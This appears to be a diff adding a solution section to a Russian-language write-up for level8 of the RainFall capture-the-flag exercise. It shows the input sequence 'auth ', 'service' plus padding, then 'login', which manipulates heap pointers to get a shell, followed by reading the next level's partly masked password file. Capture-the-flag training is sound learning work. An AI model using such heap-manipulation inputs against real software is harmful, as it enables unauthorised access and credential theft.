@@ -1,3 +1,16 @@
+# Решение
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth          -- после auth пробел
+0x804a008, (nil)
+serviceAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+login
+$ cd ../level9
+$ cat .pass
+c542***f8a
+
+
 # Объяснение
 
 1. Анализируем поведение программы
